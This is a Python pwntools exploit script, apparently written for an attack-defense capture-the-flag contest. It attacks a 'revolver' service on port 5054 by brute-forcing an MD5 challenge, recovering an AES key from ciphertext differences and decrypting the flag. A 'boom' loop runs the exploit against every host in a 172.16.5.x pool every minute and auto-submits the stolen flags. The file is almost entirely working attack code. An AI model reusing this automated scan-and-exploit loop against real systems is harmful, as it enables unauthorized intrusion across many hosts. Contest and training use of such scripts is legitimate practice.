#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from submit import submit_flag
from time import sleep
import threading
import os
from integral import round2master
from team import team

PREFIX = '172.16.5.'
TIMEOUT = 5 #TODO
DELAY = 60
LIST = range(10, 35) # victim pool
ME = 12
PORT = 5054

code = ELF('challs/revolver')
context.arch = code.arch
context.log_level = 'debug'
gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))

from hashlib import md5
from Crypto.Cipher import AES


n=73987797374151951781370452268001126363285717830362662907853749297550981365935180822074465434480351846327693684859838613977982273765527500563676847551411265449659875082316046332637357551047774600024684993188943879721915714789983278721475254014766573700511856676393909600789456199127072751315162015797723341127L

tab='_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+'

def brute(pre,tar):
    for c1 in tab:
        for c2 in tab:
            for c3 in tab:
                if md5(pre+c1+c2+c3).hexdigest()==tar:
                    return c1+c2+c3
def binsearch(x):
    l=0
    r=x-1
    while l<r:
        mid=(l+r)/2
        tmp=mid**2*3-mid*3+1
        if tmp<x:
            l=mid+1
        elif tmp>x:
            r=mid-1
        else:
            l=mid
            r=mid
	if l**2*3-l*3+1==x:
		return l
	if r**2*3-r*3+1==x:
		return r
    return -1

def exploit(c):
    #c = remote('172.16.5.19',5054)
    #c = remote('127.0.0.1',2333)
    rk=''
    c.sendlineafter('action:','2')
    c.sendlineafter('action:','1')
    c.sendlineafter('action:','1')
    c.recvuntil('opening:')
    stat = c.recv(46)
    #print stat
    aa,bb = stat.split('#')
    assert len(aa)==32
    assert len(bb)==13
    rem = brute(bb,aa)
    #print rem
    c.sendline(rem)
    c.sendlineafter('action:','3')
    c.sendlineafter('action:','1')
    c.recvuntil('encrypted flag:')
    flag=c.recvline().strip().decode('hex')
    #print flag

    c.sendlineafter('action:','3')
    c.sendlineafter('action:','6')
    c.recvuntil('c:')
    ct=c.recvline()
    ct=int(ct,16)
    c.sendlineafter('action:','3')
    c.sendlineafter('action:','7')
    c.sendlineafter('rules:','47')
    c.sendlineafter('action:','3')
    c.sendlineafter('action:','6')
    c.recvuntil('c:')
    ct2=c.recvline()
    ct2=int(ct2,16)
    #print ct,ct2
    delta=(ct-ct2)%n
    k=binsearch(delta)
    if k==-1:
        return ''
    k=hex(k)[2+64:]
    if k[-1]=='L':
        k=k[:-1]
    k=k.decode('hex')
    a=AES.new(k)
    flag=a.decrypt(flag)
    c.close()
    return flag
    #context.log_level='error'
    #c.interactive()

def boom():
    context.log_level = 'info'
    while True:
        for i in LIST:
            if i == ME:
                continue
            ip = PREFIX + str(i)
            try:
                submit_flag(exploit(remote(ip, PORT, timeout=TIMEOUT)))
                success('pwned: %s %s' % (ip, team[ip]))
            except:
                warning('failed %s : %s' % (ip, team[ip]))
                #print "\x07"
        sleep(DELAY)

if len(sys.argv) > 2: # attack one
    exploit(remote(sys.argv[1], sys.argv[2], timeout=TIMEOUT))
elif len(sys.argv) > 1:
    if sys.argv[1] == 'boom': # pwning all
        boom()
    else: # debug
        libc = ELF('/home/hdt/ldlibc/libc-2.24.dbg')
        os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
        exploit(code.process())
        #r = remote('127.0.0.1', 4444)
else: # local
    libc = code.libc
    exploit(code.process())

